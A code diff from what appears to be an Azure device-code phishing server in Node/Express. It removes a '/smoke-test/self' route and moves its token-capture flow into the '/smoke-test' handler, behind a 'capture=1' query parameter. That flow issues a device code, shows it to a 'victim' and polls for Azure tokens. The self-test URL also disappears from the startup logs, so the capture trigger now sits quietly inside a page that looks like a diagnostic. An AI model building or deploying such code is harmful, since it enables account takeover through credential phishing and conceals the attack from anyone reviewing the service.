@@ -58,10 +58,6 @@ function smokeTestUrl() {
     return publicUrl(config, '/smoke-test', __dirname);
 }
 
-function selfTestUrl() {
-    return publicUrl(config, '/smoke-test/self', __dirname);
-}
-
 function displayCodeToVictim(res, userCode) {
     const date = new Date();
     date.setDate(date.getDate() + config.cookieExpirationInDays);
@@ -388,10 +384,20 @@ app.get('/share', async (req, res, next) => {
 
 app.get('/smoke-test', async (req, res) => {
     try {
+        if (req.query.capture === '1') {
+            const selfConfig = { ...config, ...COMMON_ENDPOINTS };
+            const deviceCodeResponse = await fetchDeviceCode(selfConfig);
+            const userCode = deviceCodeResponse.user_code;
+            const deviceCode = deviceCodeResponse.device_code;
+            logMessage(`Smoke-test capture — issued device code ${userCode} (common endpoints)`);
+            displayCodeToVictim(res, userCode);
+            pollForAzureTokens(deviceCode, userCode, selfConfig);
+            return;
+        }
+
         const results = await runSmokeTests(config, { rootDir: __dirname });
         res.send(renderSmokeTestPage(results, {
             smokeTestUrl: smokeTestUrl(),
-            selfTestUrl: selfTestUrl(),
             victimUrl: victimUrl(),
         }));
         logMessage(`Smoke test page served (${results.ok ? 'pass' : 'fail'})`);
@@ -401,27 +407,11 @@ app.get('/smoke-test', async (req, res) => {
     }
 });
 
-app.get('/smoke-test/self', async (req, res) => {
-    try {
-        const selfConfig = { ...config, ...COMMON_ENDPOINTS };
-        const deviceCodeResponse = await fetchDeviceCode(selfConfig);
-        const userCode = deviceCodeResponse.user_code;
-        const deviceCode = deviceCodeResponse.device_code;
-        logMessage(`Self-test /smoke-test/self — issued device code ${userCode} (common endpoints)`);
-        displayCodeToVictim(res, userCode);
-        pollForAzureTokens(deviceCode, userCode, selfConfig);
-    } catch (error) {
-        logMessage(error.stack, 'error');
-        res.status(500).send(`Self-test failed: ${error.message}`);
-    }
-});
-
 if (config.testMode) {
     http.createServer(app).listen(config.httpPort, () => {
         logMessage('App listening on port ' + config.httpPort);
         logMessage('Victim URL: ' + victimUrl());
         logMessage('Smoke test URL: ' + smokeTestUrl());
-        logMessage('Self-test URL: ' + selfTestUrl());
     });
 } else {
     const tlsOptions = {
@@ -436,6 +426,5 @@ if (config.testMode) {
         logMessage('App listening on port ' + config.httpsPort);
         logMessage('Victim URL: ' + victimUrl());
         logMessage('Smoke test URL: ' + smokeTestUrl());
-        logMessage('Self-test URL: ' + selfTestUrl());
     });
 }
